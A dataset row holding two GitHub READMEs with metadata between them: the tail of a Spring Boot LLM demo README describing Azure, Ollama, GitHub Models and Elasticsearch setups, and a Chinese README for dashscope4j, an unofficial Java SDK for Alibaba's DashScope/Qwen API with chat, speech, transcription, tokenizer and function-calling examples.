- __Embedding model__: Azure OpenAI with text-embedding-ada
- __Embedding store__: Azure AI Search

It is enabled by using the `azure` Spring Boot profile.
One way to do this is to set `spring.profiles.active=azure` in the `src/main/resources/application.properties` file.

To provision the Azure resources, you need to run the `src/main/script/deploy-azure-openai-models.sh` script. It will create the following resources:

- An Azure OpenAI instance, with the necessary OpenAI models for this demo.
- An Azure AI Search instance.

At the end of this script, the following environment variables will be displayed (and stored in the `.env` file), and you will need them to run the application:
- `AZURE_OPENAI_ENDPOINT`: your Azure OpenAI URL endpoint.
- `AZURE_OPENAI_KEY`: your Azure OpenAI API key.
- `AZURE_SEARCH_ENDPOINT`: your Azure AI Search URL endpoint.
- `AZURE_SEARCH_KEY`: your Azure AI Search API key.

### _Option 2_ : Fully local, not very good, but small and fast

This configuration uses:

- __Chat Model__: Ollama with tinyllama
- __Image Model__: Not available
- __Embedding model__: in-memory Java with AllMiniLmL6V2EmbeddingModel
- __Embedding store__: Qdrant

It is enabled by using the `small` Spring Boot profile.
One way to do this is to set `spring.profiles.active=small` in the `src/main/resources/application.properties` file.

To set up the necessary resources, you need to have Docker installed on your machine, and run with Docker Compose the `src/main/docker/docker-compose-small.yml` file.

It will set up:

- An Ollama instance, with the tinyllama model.
- A Qdrant instance. Its Web UI is available at [http://localhost:6333/dashboard](http://localhost:6333/dashboard).

### _Option 3_ : Fully local, not very fast, but with good quality

This configuration uses:

- __Chat Model__: Ollama with Phi 3.5
- __Image Model__: Not available
- __Embedding model__: Ollama with nomic-embed-text
- __Embedding store__: Qdrant

It is enabled by using the `good` Spring Boot profile.
One way to do this is to set `spring.profiles.active=good` in the `src/main/resources/application.properties` file.

This configuration, especially when running inside Docker, requires a good amount of resources (CPU and RAM).
If you run into timeouts, that's because your machine is not powerful enough to run it.

__Improving performance__: if you have GPUs on your machine, Ollama performance can be greatly improved by using them. The easiest way is to install Ollama locally on your machine, and install the
models like in the `src/main/docker/install-ollama-models-good.sh` script.

To set up the necessary resources, you need to have Docker installed on your machine, and run with Docker Compose the `src/main/docker/docker-compose-good.yml` file.

It will set up:

- An Ollama instance, with the phi3.5 and the nomic-embed-text models. Its Web UI is available at [http://localhost:8081/](http://localhost:8081/).
- A Qdrant instance. Its Web UI is available at [http://localhost:6333/dashboard](http://localhost:6333/dashboard).

### _Option 4_ : GitHub Models

GitHub Models are available [here](https://github.com/marketplace/models).

This configuration uses:

- __Chat Model__: GitHub Models with gpt-4o-mini
- __Image Model__: Not available
- __Embedding model__: GitHub Models with text-embedding-3-small
- __Embedding store__: Qdrant

It is enabled by using the `github` Spring Boot profile.
One way to do this is to set `spring.profiles.active=github` in the `src/main/resources/application.properties` file.

To set up the necessary resources, you need to have Docker installed on your machine, and run with Docker Compose the `src/main/docker/docker-compose-github.yml` file.

It will set up:

- A Qdrant instance. Its Web UI is available at [http://localhost:6333/dashboard](http://localhost:6333/dashboard).

For accessing GitHub Models, you'll need an environment variable named `GITHUB_TOKEN` with a GitHub token that grants permission to access the models.

### _Option 5_ : Same as option 3 (""good""), but using Elasticsearch instead of Qdrant as an embedding store

This configuration uses:

- __Chat Model__: Ollama with Phi 3.5
- __Image Model__: Not available
- __Embedding model__: Ollama with nomic-embed-text
- __Embedding store__: Elasticsearch

It is enabled by using the `elasticsearch` Spring Boot profile.
One way to do this is to set `spring.profiles.active=elasticsearch` in the `src/main/resources/application.properties` file.

This configuration, especially when running inside Docker, requires a good amount of resources (CPU and RAM).
If you run into timeouts, that's because your machine is not powerful enough to run it.

__Improving performance__: if you have GPUs on your machine, Ollama performance can be greatly improved by using them. The easiest way is to install Ollama locally on your machine, and install the
models like in the `src/main/docker/install-ollama-models-good.sh` script.

To set up the necessary resources, you need to have Docker installed on your machine, and run with Docker Compose the `src/main/docker/docker-compose-elasticsearch.yml` file.

It will set up:

- An Ollama instance, with the phi3.5 and the nomic-embed-text models.
- An Elasticsearch instance. Its Web UI is available at [http://localhost:8081](http://localhost:8081).

## Running the demos

Once the resources (Azure or local) are configured, you can run the demos using the following command:

```shell
./mvnw spring-boot:run
```

Then you can access the base URL, where you find the Web UI: [http://localhost:8080/](http://localhost:8080/).

The demos are available in the top menu.
",0,0,4,apache-2.0,2.0,"['demo', 'author', 'julien', 'dubois', 'goal', 'spring', 'boot', 'project', 'demonstrates', 'use', 'create', 'java', 'application', 'using', 'llm', 'contains', 'following', 'demo', 'generate', 'image', 'using', 'generate', 'text', 'using', 'tinyllama', 'use', 'chat', 'conversation', 'memory', 'context', 'ingest', 'data', 'vector', 'database', 'use', 'easy', 'rag', 'work', 'complete', 'example', 'using', 'demo', 'either', 'run', 'locally', 'docker', 'using', 'ollama', 'qdrant', 'cloud', 'using', 'azure', 'openai', 'github', 'model', 'azure', 'ai', 'search', 'slide', 'slide', 'deck', 'available', 'detail', 'demo', 'introduction', 'quick', 'overview', 'easyrag', 'focus', 'demo', 'detailing', 'rag', 'pattern', 'configuration', 'several', 'spring', 'boot', 'profile', 'test', 'demo', 'different', 'configuration', 'tool', 'model', 'option', 'running', 'cloud', 'azure', 'configuration', 'us', 'chat', 'model', 'azure', 'openai', 'image', 'model', 'azure', 'openai', 'embedding', 'model', 'azure', 'openai', 'embedding', 'store', 'azure', 'ai', 'search', 'enabled', 'using', 'spring', 'boot', 'profile', 'one', 'way', 'set', 'file', 'provision', 'azure', 'resource', 'need', 'run', 'script', 'create', 'following', 'resource', 'azure', 'openai', 'instance', 'necessary', 'openai', 'model', 'demo', 'azure', 'ai', 'search', 'instance', 'end', 'script', 'following', 'environment', 'variable', 'displayed', 'stored', 'file', 'need', 'run', 'application', 'azure', 'openai', 'url', 'endpoint', 'azure', 'openai', 'api', 'key', 'azure', 'ai', 'search', 'url', 'endpoint', 'azure', 'ai', 'search', 'api', 'key', 'option', 'fully', 'local', 'good', 'small', 'fast', 'configuration', 'us', 'chat', 'model', 'ollama', 'tinyllama', 'image', 'model', 'available', 'embedding', 'model', 'java', 'embedding', 'store', 'qdrant', 'enabled', 'using', 'spring', 'boot', 'profile', 'one', 'way', 'set', 'file', 'set', 'necessary', 'resource', 'need', 'docker', 'installed', 'machine', 'run', 'docker', 'compose', 'file', 'set', 'ollama', 'instance', 'tinyllama', 'model', 'qdrant', 'instance', 'web', 'ui', 'available', 'http', 'option', 'fully', 'local', 'fast', 'good', 'quality', 'configuration', 'us', 'chat', 'model', 'ollama', 'phi', 'image', 'model', 'available', 'embedding', 'model', 'ollama', 'embedding', 'store', 'qdrant', 'enabled', 'using', 'spring', 'boot', 'profile', 'one', 'way', 'set', 'file', 'configuration', 'especially', 'running', 'inside', 'docker', 'requires', 'good', 'amount', 'resource', 'cpu', 'ram', 'run', 'timeouts', 'machine', 'powerful', 'enough', 'run', 'improving', 'performance', 'gpus', 'machine', 'ollama', 'performance', 'greatly', 'improved', 'using', 'easiest', 'way', 'install', 'ollama', 'locally', 'machine', 'install', 'model', 'like', 'script', 'set', 'necessary', 'resource', 'need', 'docker', 'installed', 'machine', 'run', 'docker', 'compose', 'file', 'set', 'ollama', 'instance', 'model', 'web', 'ui', 'available', 'http', 'qdrant', 'instance', 'web', 'ui', 'available', 'http', 'option', 'github', 'model', 'github', 'model', 'available', 'configuration', 'us', 'chat', 'model', 'github', 'model', 'image', 'model', 'available', 'embedding', 'model', 'github', 'model', 'embedding', 'store', 'qdrant', 'enabled', 'using', 'spring', 'boot', 'profile', 'one', 'way', 'set', 'file', 'set', 'necessary', 'resource', 'need', 'docker', 'installed', 'machine', 'run', 'docker', 'compose', 'file', 'set', 'qdrant', 'instance', 'web', 'ui', 'available', 'http', 'accessing', 'github', 'model', 'need', 'environment', 'variable', 'named', 'github', 'token', 'grant', 'permission', 'access', 'model', 'option', 'option', 'good', 'using', 'elasticsearch', 'instead', 'qdrant', 'embedding', 'store', 'configuration', 'us', 'chat', 'model', 'ollama', 'phi', 'image', 'model', 'available', 'embedding', 'model', 'ollama', 'embedding', 'store', 'elasticsearch', 'enabled', 'using', 'spring', 'boot', 'profile', 'one', 'way', 'set', 'file', 'configuration', 'especially', 'running', 'inside', 'docker', 'requires', 'good', 'amount', 'resource', 'cpu', 'ram', 'run', 'timeouts', 'machine', 'powerful', 'enough', 'run', 'improving', 'performance', 'gpus', 'machine', 'ollama', 'performance', 'greatly', 'improved', 'using', 'easiest', 'way', 'install', 'ollama', 'locally', 'machine', 'install', 'model', 'like', 'script', 'set', 'necessary', 'resource', 'need', 'docker', 'installed', 'machine', 'run', 'docker', 'compose', 'file', 'set', 'ollama', 'instance', 'model', 'elasticsearch', 'instance', 'web', 'ui', 'available', 'http', 'running', 'demo', 'resource', 'azure', 'local', 'configured', 'run', 'demo', 'using', 'following', 'command', 'access', 'base', 'url', 'find', 'web', 'ui', 'http', 'demo', 'available', 'top', 'menu']","['model', 'using', 'azure', 'ollama', 'set']",1,0,0,"['demo', 'goal', 'slide', 'configuration', 'run', 'cloud', 'azure', 'fully', 'local', 'good', 'small', 'fast', 'fully', 'local', 'fast', 'good', 'quality', 'github', 'model', 'same', 'option', 'good', 'use', 'elasticsearch', 'instead', 'qdrant', 'embed', 'store', 'run', 'demo']",10,"['good', 'demo', 'run', 'fully', 'local']",1,0.0,1.0,"[org.graalvm.buildtools:native-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,6909,20.50943396226415,4.928242870285189,"['Julien Dubois -> https://www.julien-dubois.com', 'http://localhost:6333/dashboard -> http://localhost:6333/dashboard', 'http://localhost:8081/ -> http://localhost:8081/', 'http://localhost:6333/dashboard -> http://localhost:6333/dashboard', 'here -> https://github.com/marketplace/models', 'http://localhost:6333/dashboard -> http://localhost:6333/dashboard', 'http://localhost:8081 -> http://localhost:8081', 'http://localhost:8080/ -> http://localhost:8080/']",8
oldmanpushcart/dashscope4j,main,"# DashScope4j：灵积 Java SDK

![License](https://img.shields.io/badge/License-Apache_2.0-green.svg)
![JDK17+](https://img.shields.io/badge/JDK-17+-blue.svg)
![LLM-通义千问](https://img.shields.io/badge/LLM-%E9%80%9A%E4%B9%89%E5%8D%83%E9%97%AE-blue.svg)

`DashScope4j`是一个开源的灵积非官方 Java SDK，基于 JDK17
构建。它旨在提供一个功能丰富、易于集成和使用灵积API（通义千问模型）的Java库，以便开发者能够通灵积API轻松实现多模态对话、向量嵌入和图像处理等功能。

> 请注意：在使用 DashScope4j 时，你需要遵守灵积API的使用条款和条件。

## 依赖使用

```xml
<dependency>
    <groupId>io.github.oldmanpushcart</groupId>
    <artifactId>dashscope4j</artifactId>
    <version>2.2.1</version>
</dependency>
```

## 重要更新

- **2.2.1：** 问题修复版本，修复问题 #19 #18

- **2.2.0：** 语音识别与合成支持
  > [例子：如何用通义千问做一个同声传译](https://github.com/oldmanpushcart/dashscope4j/wiki/Example-SimulaTrans)
  - 新增双工数据交互操作接口`Exchange`，用于支持语音、视频等多模态模型交互
  - 支持实时语音识别
  - 支持实时语音合成
  - 支持音视频转录
  - 支持远程、本地Tokenizer
  - 优化部分API，存在不向下兼容可能
    - 所有对外暴露的`CompletableFuture`变更为`CompletionStage`，解决暴露接口功能过于强大的问题
    - 增加`HttpApiRequest / Response`和`ExchangeApiRequest / Response`的API分层，为了更好地支持多模态数据交互做准备

- **2.1.0：** 不兼容API修复
    - 修复模块中错误的exports，该修复会将模块中不应该暴露的内部api重新收回。本次修复不向下兼容。
    - 修复ChatRequest中函数调用因为Message序列化问题丢失PluginCall、Plugin、ToolCall、Tool等信息的BUG

- **2.0.0：** 大版本重构。核心API进行不兼容调整和实现重构（请注意），删除1.x.x版本被标记为已废弃的方法
    - 重构拦截器接口和实现重构，并添加了流控、重试等拦截器实现
    - 调整部分类、API的位置和命名；删除已废弃的方法
    - Flow相关实现进行重构

- **1.x.x：** 历代版本核心功能
    - **1.4.0：** 支持无感临时空间、请求和应答拦截器
    - **1.3.0：** 支持多模态向量计算
    - **1.2.0：** 支持多函数级联调用
    - **1.1.1：** 第一个稳定版本

### 语音合成

我们可以通过以下代码进行语音合成：

```java
// 文本集合
final var strings = new String[]{
    ""白日依山尽，"",
    ""黄河入海流。"",
    ""欲穷千里目，"",
    ""更上一层楼。""
};

/*
 * 语音合成请求
 * 采样率：16000
 * 编码格式：WAV(PCM)
 */
final var request = SpeechSynthesisRequest.newBuilder()
    .model(SpeechSynthesisModel.COSYVOICE_LONGXIAOCHUN_V1)
    .option(SpeechSynthesisOptions.SAMPLE_RATE, 16000)
    .option(SpeechSynthesisOptions.FORMAT, SpeechSynthesisRequest.Format.WAV)
    .build();

// 以语音合成请求为模板，对每个文本生成一个语音合成请求
final var requests = Stream.of(strings)
    .map(string -> SpeechSynthesisRequest.newBuilder(request)
        .text(string)
        .build()
    )
    .toList();

// 聚合成请求发布器
final var requestPublisher = FlowPublishers.fromIterator(requests);

// 进行语音合成
client.audio().synthesis(request)

    // 打开语音合成数据交互通道：全双工模式，输出到audio.wav文件
    .exchange(Exchange.Mode.DUPLEX, ExchangeListeners.ofPath(Path.of(""./audio.wav"")))
    
    // 发送语音合成请求序列
    .thenCompose(exchange -> exchange.writeDataPublisher(requestPublisher))
    
    // 语音合成结束
    .thenCompose(Exchange::finishing)
    
    // 等待通道关闭
    .thenCompose(Exchange::closeFuture)
    .toCompletableFuture()
    .join();
```
这样我们就可以获取到生成的`audio.wav`文件，可以试着播放下，符不符合你的要求。

当然你也可以通过`ExchangeListeners.ofByteChannel(...)`方法，将输出的字节流转入到你指定的`ByteChannel`中，比如音频播放设备。这样就可以实现语音播放。
在语音合成结束后，为了避免对通道的占用，需要及时关闭`Exchange`

发送语音合成结束请求：
```java
exchange.finishing()
```

服务端收到结束请求后会主动来关闭通道，你可以调用`Exchange.closeFuture()`方法来获取关闭通道的Future。
```java
exchange.closeFuture()
```

### 语音识别

基于上一节 ""语音合成"" 的示例，我们得到了`audio.wav`，接下来我们可以用语音识别来识别这个音频文件。

```java
// 构建音频文件的ByteBuffer发布器
final var byteBufPublisher = FlowPublishers.fromURI(Path.of(""./audio.wav"").toUri());

/*
 * 构建语音识别请求
 * 采样率：16000
 * 音频格式：WAV(PCM)
 */
final var request = RecognitionRequest.newBuilder()
    .model(RecognitionModel.PARAFORMER_REALTIME_V2)
    .option(RecognitionOptions.SAMPLE_RATE, 16000)
    .option(RecognitionOptions.FORMAT, RecognitionRequest.Format.WAV)
    .build();

// 识别文本缓存
final var stringBuf = new StringBuilder();

// 进行语音识别
client.audio().recognition(request)

    // 打开语音识别数据交互通道：全双工模式，输出到文本缓存
    .exchange(Exchange.Mode.DUPLEX, ExchangeListeners.ofConsume(response -> {
        if (response.output().sentence().isEnd()) {
            stringBuf.append(response.output().sentence().text()).append(""\n"");
        }
    }))
    
    // 发送音频文件字节流数据
    .thenCompose(exchange -> exchange.writeByteBufferPublisher(byteBufPublisher))
    
    // 语音识别结束
    .thenCompose(Exchange::finishing)
    
    // 等待通道关闭
    .thenCompose(Exchange::closeFuture)
    .toCompletableFuture()
    .join();

// 输出识别文本
System.out.println(stringBuf);
```

文本识别结果为

```text
白日依山尽，黄河入海流。
欲穷千里目，更上一层楼。
```

### 音视频转录

音视频转录不仅能转录音频文件，而且还可以将视频文件中的音频转录为文本。这就省得我们用ffmpeg剥离视频中的音轨这样繁琐的操作了。
在这个例子中，我用我最喜欢的一个动漫《钢之炼金术士》来演示如何从通过音视频转录功能识别视频音轨的文本信息。

> 这对用AI做字幕多少有点启发，毕竟谁没有几个没有字幕的动作片呢？

```java
/*
 * 构建音视频转录请求
 * 语言：日文
 * 选项：过滤语气词（日片中很多以库以库的语气词，各位懂的都懂）
 */
final var request = TranscriptionRequest.newBuilder()
    .model(TranscriptionModel.PARAFORMER_V2)
    // 也可以使用本地文件，本地文件会自动上传到DashScope的临时空间
    .resources(List.of(URI.create(""https://ompc-storage.oss-cn-hangzhou.aliyuncs.com/dashscope4j/video/%5Bktxp%5D%5BFullmetal%20Alchemist%5D%5Bjap_chn%5D01.rmvb"")))
    .option(TranscriptionOptions.ENABLE_DISFLUENCY_REMOVAL, true)
    .option(TranscriptionOptions.LANGUAGE_HINTS, new LanguageHint[]{LanguageHint.JA})
    .build();

// 进行音视频转录
final var response = client.audio().transcription(request)

    // 等待任务完成，每隔30s进行检查任务状态
    .task(Task.WaitStrategies.perpetual(Duration.ofMillis(1000L * 30)))
    .toCompletableFuture()
    .join();

// 合并音视频转录文本（当前只有一个视频）
final var text = response.output().results().stream()
    .map(result-> {
    
        // 下载转录结果
        final var transcription = result.lazyFetchTranscription()
            .toCompletableFuture()
            .join();
    
        // 合并转录句子（每行一个句子）
        return transcription.transcripts().stream()
            .flatMap(transcript->transcript.sentences().stream())
            .map(sentence-> ""%s - %s: %s"".formatted(
                sentence.begin(),
                sentence.end(),
                sentence.text()
            ))
            .reduce((a, b) -> a + ""\n"" + b)
            .orElse("""");
    
    })
    
    // 合并多个音视频转录文本，当前只有一个视频
    .reduce((a, b) -> a + b)
    .orElse("""");

// 输出音视频转录文本
System.out.println(text);
```

输出摘录
```text
13920 - 19960: で き た あ る 大 丈 夫. 
20060 - 24620: 完 璧 だ. 
28380 - 32940: や る ぞ. 
49480 - 58200: 錬 金 術 と は 物 質 の 構 造 を 理 解 し 分 解 し 再 構 築 す る 科 学 技 術 で あ る. 
58820 - 64900: そ れ は う ま く す れ ば 鉛 り か ら 黄 金 を 生 み 出 す こ と も 可 能 に な る. 
65500 - 71760: し か し 科 学 で あ る 以 上 そ こ に は 大 自 然 の 計 測 が 存 在 し た. 
75300 - 79860: 質 量 が 一 の も の か ら は 一 の も の し か 生 み 出 せ な い. 
80200 - 84760: 強 化 交 換 に 計 測. 
```

例子中采用的是一个远程文件，但实际上你也可以使用一个本地文件，例如`Path.of(""./video.mp4"").toUri()`，dashscope4j会将视频文件上传到DashScope的临时空间。

### Tokenizer

在实际开发过程中，为了让AI记住上下文，你需要把之前的聊天记录作为对话上下文输入。但模型的输入长度有限，所以需要将上下文进行分段，然后进行分段输入。
有一种分割方案就是根据模型能支撑的最大token进行切分，这个时候你就需要一个工具来计算一段文本的token数到底是多少，以达到最大化保留记忆的分割目的。

Tokenizer工具能很好的帮助你实现这一点，他分远程和本地两种调用方式，远程性能较差但计算的token会更精准，本地性能最佳，但会存在一定的版本滞后性。
不同的模型，同样的文字，计算的token可能不一样。但大差不差。

在实际生产环境中，推荐使用本地计算的方案。

#### 远程计算

```java
final var messages = List.of(
    Message.ofUser(""北京有哪些好玩地方？""),
    Message.ofAi(""故宫、颐和园、天坛等都是可以去游玩的景点哦。""),
    Message.ofUser(""帮我安排一些行程"")
);

// 远程调用需要明确算法模型
final var list = client.base().tokenize().remote(ChatModel.QWEN_PLUS)
    .encode(messages)
    .toCompletableFuture()
    .join();

System.out.println(""total tokens: "" + list.size());
```

#### 本地计算

```java
final var messages = List.of(
    Message.ofUser(""北京有哪些好玩地方？""),
    Message.ofAi(""故宫、颐和园、天坛等都是可以去游玩的景点哦。""),
    Message.ofUser(""帮我安排一些行程"")
);

final var list = client.base().tokenize().local()
    .encode(messages)
    .toCompletableFuture()
    .join();

System.out.println(""total tokens: "" + list.size());
```

## 一、主要功能

`DashScope4j`支持以下API功能：

- **对话（Chat）**
    - 提供用户与灵积进行多模态(图、文)对话
    - 提供用户与灵积进行多模态(图、音)对话
    - 提供用户与灵积进行函数对话

- **向量（Embeddings）**
    - 将文本转换为向量表示，用于文本相似度比较、聚类等任务
    - 将图音文本转换为向量表示，用于图音文相似度比较、聚类等任务

- **图像（Images）**
    - **文生图：** 将文本描述转换为相应的图像

- **语音识别与合成**
  - 支持实时语音识别
  - 支持实时语音合成
  - 支持音视频转录

- **基础功能**
  - 支持Tokenizer计算（远程、本地）
  - 支持灵积提供的临时空间
  - 请求、应答拦截器

- **插件应用（Plugin）**
    - **OCR插件：** 图像理解识别，并对图像内容进行总结概述，输出用户可理解的句子或段落
    - **PDF解析插件：** 对PDF文件进行解析，提取、理解文本内容
    - **计算器插件：** 对用户输入的数学表达式进行计算
    - **文生图插件：** 将文本描述转换为相应的图像

## 二、系统要求

1. **JDK17**或更高版本

## 三、跑通测试

1. 到阿里云的[模型服务-灵积](https://dashscope.console.aliyun.com/)中开通服务，获取`AK`
2. 到[API-KEY管理]()中创建一个`API-KEY`，获取其`AK`
3. 声明环境变量`export DASHSCOPE_AK=<YOUR APP-KEY>`
4. 运行测试用例：`mvn test`

## 四、使用示例

### 创建客户端

```java

// 线程池
final var executor = Executors.newFixedThreadPool(10);

// 创建客户端
final var client = DashScopeClient.newBuilder()
    .ak(""<YOUR APP-KEY>"")
    .executor(executor)
    .build();
```

### 对话示例（异步）

```java
// 创建请求
final var request = ChatRequest.newBuilder()
    .model(ChatModel.QWEN_VL_MAX)
    .messages(List.of(
        Message.ofUser(List.of(
            Content.ofImage(new File(""./document/image/image-002.jpeg"").toURI()),
            Content.ofText(""图片中一共多少辆自行车?"")
        ))
    ))
    .build();

// 异步应答
final var response = client.chat(request)
    .async()
    .toCompletableFuture()
    .join();

// 输出结果（异步）
System.out.println(response.output().best().message().text());
```

输出日志

```text
2024-02-29 00:49:56 DEBUG dashscope://chat/qwen-vl-max => {""model"":""qwen-vl-max"",""input"":{""messages"":[{""role"":""user"",""content"":[{""image"":""https://ompc-images.oss-cn-hangzhou.aliyuncs.com/image-002.jpeg""},{""text"":""图片中一共多少辆自行车?""}]}]},""parameters"":{}}
2024-02-29 00:49:59 DEBUG dashscope://chat/qwen-vl-max <= {""output"":{""choices"":[{""finish_reason"":""stop"",""message"":{""role"":""assistant"",""content"":[{""text"":""图片中有两辆自行车。""}]}}]},""usage"":{""output_tokens"":7,""input_tokens"":1264,""image_tokens"":1230},""request_id"":""f11e20f0-6774-9649-a0c9-6095e6287cdc""}
图片中有两辆自行车。
```

### 对话示例（流式）

```java
// 创建请求
final var request = ChatRequest.newBuilder()
    .model(ChatModel.QWEN_VL_MAX)
    .option(ChatOptions.ENABLE_INCREMENTAL_OUTPUT, true)
    .messages(List.of(
        Message.ofUser(List.of(
            Content.ofImage(new File(""./document/image/image-002.jpeg"").toURI()),
            Content.ofText(""图片中一共多少辆自行车?"")
        ))
    ))
    .build();

// 流式应答
final var publisher = client.chat(request)
    .flow()
    .toCompletableFuture()
    .join();

// 应答输出（流式）
final var latch = new CountDownLatch(1);
final var stringSB = new StringBuilder();
publisher.subscribe(new Flow.Subscriber<>(){

    @Override
    public void onSubscribe(Flow.Subscription subscription) {
        subscription.request(Long.MAX_VALUE);
    }
    
    @Override
    public void onNext(ChatResponse response) {
        stringSB.append(response.output().best().message().text());
    }
    
    @Override
    public void onError(Throwable ex) {
        ex.printStackTrace(System.err);
    }
    
    @Override
    public void onComplete() {
        latch.countDown();
    }

});

// 等待处理完成
latch.await();
System.out.println(stringSB);
```

输出日志

```text
2024-02-29 01:21:42 DEBUG dashscope://chat/qwen-vl-max => {""model"":""qwen-vl-max"",""input"":{""messages"":[{""role"":""user"",""content"":[{""image"":""https://ompc-images.oss-cn-hangzhou.aliyuncs.com/image-002.jpeg""},{""text"":""图片中一共多少辆自行车?""}]}]},""parameters"":{""incremental_output"":true}}
2024-02-29 01:21:44 DEBUG dashscope://chat/qwen-vl-max <= {""output"":{""choices"":[{""message"":{""content"":[{""text"":""图片""}],""role"":""assistant""},""finish_reason"":""null""}]},""usage"":{""input_tokens"":1264,""output_tokens"":1,""image_tokens"":1230},""request_id"":""9713405c-31b3-97a5-8e99-ac2c685798a0""}
2024-02-29 01:21:44 DEBUG dashscope://chat/qwen-vl-max <= {""output"":{""choices"":[{""message"":{""content"":[{""text"":""中有""}],""role"":""assistant""},""finish_reason"":""null""}]},""usage"":{""input_tokens"":1264,""output_tokens"":2,""image_tokens"":1230},""request_id"":""9713405c-31b3-97a5-8e99-ac2c685798a0""}
2024-02-29 01:21:45 DEBUG dashscope://chat/qwen-vl-max <= {""output"":{""choices"":[{""message"":{""content"":[{""text"":""两""}],""role"":""assistant""},""finish_reason"":""null""}]},""usage"":{""input_tokens"":1264,""output_tokens"":3,""image_tokens"":1230},""request_id"":""9713405c-31b3-97a5-8e99-ac2c685798a0""}
2024-02-29 01:21:45 DEBUG dashscope://chat/qwen-vl-max <= {""output"":{""choices"":[{""message"":{""content"":[{""text"":""辆自行车。""}],""role"":""assistant""},""finish_reason"":""stop""}]},""usage"":{""input_tokens"":1264,""output_tokens"":7,""image_tokens"":1230},""request_id"":""9713405c-31b3-97a5-8e99-ac2c685798a0""}
图片中有两辆自行车。
```

### 函数调用示例

灵积在 2024-03-12 放出了**函数调用**的功能，当前支持的模型是大语言模型：qwen-turbo、qwen-plus、qwen-max、qwen-max-longcontext，下面是一个函数调用的示例：

#### 单个函数调用示例：回显

假设我们有一个回显函数:`echo`

```java
@ChatFn(name = ""echo"", description = ""当用户输入echo:，回显后边的文字"")
public class EchoFunction implements ChatFunction<EchoFunction.Echo, EchoFunction.Echo> {

  @Override
  public CompletionStage<Echo> call(Echo echo) {
    return CompletableFuture.completedFuture(new Echo(echo.words()));
  }

  public record Echo(
          @JsonPropertyDescription(""需要回显的文字"")
          String words
  ) {

  }

}
```

我们可以通过以下代码来调用这个函数：

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.QWEN_MAX)
    .functions(List.of(new EchoFunction()))
    .messages(List.of(
        Message.ofUser(""echo: HELLO!"")
    ))
    .build();
final var response = client.chat(request)
    .async()
    .toCompletableFuture()
    .join();
```

输出日志

```text
2024-03-19 21:28:38 DEBUG dashscope://chat/qwen-max => {""model"":""qwen-max"",""input"":{""messages"":[{""role"":""user"",""content"":""echo: HELLO!""}]},""parameters"":{""result_format"":""message"",""tools"":[{""function"":{""name"":""echo"",""description"":""当用户输入echo:，回显后边的文字"",""parameters"":{""type"":""object"",""properties"":{""words"":{""type"":""string"",""description"":""需要回显的文字""}}}},""type"":""function""}]}}
2024-03-19 21:28:40 DEBUG dashscope://chat/qwen-max <= {""output"":{""choices"":[{""finish_reason"":""tool_calls"",""message"":{""role"":""assistant"",""tool_calls"":[{""function"":{""name"":""echo"",""arguments"":""{\""words\"": \""HELLO!\""}""},""id"":"""",""type"":""function""}],""content"":""""}}]},""usage"":{""total_tokens"":28,""output_tokens"":23,""input_tokens"":5},""request_id"":""8af40d7a-d43d-9d7f-9f12-8d52accfe8ac""}
2024-03-19 21:28:40 DEBUG dashscope://chat/function/echo <= {""words"":""HELLO!""}
2024-03-19 21:28:40 DEBUG dashscope://chat/function/echo => {""words"":""HELLO!""}
2024-03-19 21:28:40 DEBUG dashscope://chat/qwen-max => {""model"":""qwen-max"",""input"":{""messages"":[{""role"":""user"",""content"":""echo: HELLO!""},{""role"":""assistant"",""tool_calls"":[{""function"":{""name"":""echo"",""arguments"":""{\""words\"": \""HELLO!\""}""},""type"":""function""}],""content"":""""},{""role"":""tool"",""name"":""echo"",""content"":""{\""words\"":\""HELLO!\""}""}]},""parameters"":{""result_format"":""message"",""tools"":[{""function"":{""name"":""echo"",""description"":""当用户输入echo:，回显后边的文字"",""parameters"":{""type"":""object"",""properties"":{""words"":{""type"":""string"",""description"":""需要回显的文字""}}}},""type"":""function""}]}}
2024-03-19 21:28:42 DEBUG dashscope://chat/qwen-max <= {""output"":{""choices"":[{""finish_reason"":""stop"",""message"":{""role"":""assistant"",""content"":""HELLO!""}}]},""usage"":{""total_tokens"":8,""output_tokens"":3,""input_tokens"":5},""request_id"":""37ff7303-c1b2-9d7c-966d-82a7446fc52e""}
HELLO!
```

#### 级联函数调用示例：成绩查询

我们有两个函数

- 查询成绩函数：[query_score](https://github.com/oldmanpushcart/dashscope4j/blob/main/src/test/java/io/github/oldmanpushcart/test/dashscope4j/chat/function/QueryScoreFunction.java)
- 计算平均分函数：[compute_avg_score](https://github.com/oldmanpushcart/dashscope4j/blob/main/src/test/java/io/github/oldmanpushcart/test/dashscope4j/chat/function/ComputeAvgScoreFunction.java)

现在需要查询某个同学的所有成绩，并计算其平均分。LLM需要先调用 `query_score` 函数查询成绩，然后再调用 `compute_avg_score`
函数计算平均分。

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.QWEN_PLUS)
    .functions(List.of(
        new QueryScoreFunction(),
        new ComputeAvgScoreFunction()
    ))
    .messages(List.of(
        Message.ofUser(""张三的所有成绩，并计算平均分"")
    ))
    .build();
final var response = client.chat(request)
    .async()
    .toCompletableFuture()
    .join();
```

输出日志

```text
2024-03-20 23:50:17 DEBUG dashscope://chat/qwen-plus => {""model"":""qwen-plus"",""input"":{""messages"":[{""role"":""user"",""content"":""张三的所有成绩，并计算平均分""}]},""parameters"":{""result_format"":""message"",""tools"":[{""function"":{""name"":""query_score"",""description"":""query student's scores"",""parameters"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""the student name to query""},""subjects"":{""type"":""array"",""description"":""the subjects to query"",""items"":{""type"":""string"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]}}},""required"":[""name"",""subjects""]}},""type"":""function""},{""function"":{""name"":""compute_avg_score"",""description"":""计算平均成绩"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""分数集合"",""items"":{""type"":""number""}}}}},""type"":""function""}]}}
2024-03-20 23:50:20 DEBUG dashscope://chat/qwen-plus <= {""output"":{""choices"":[{""finish_reason"":""tool_calls"",""message"":{""role"":""assistant"",""tool_calls"":[{""function"":{""name"":""query_score"",""arguments"":""{\""name\"": \""张三\"", \""subjects\"": [\""CHINESE\"", \""MATH\"", \""ENGLISH\""]}""},""id"":"""",""type"":""function""}],""content"":""""}}]},""usage"":{""total_tokens"":47,""output_tokens"":39,""input_tokens"":8},""request_id"":""4703f631-a245-967e-ba86-8f01327a82bf""}
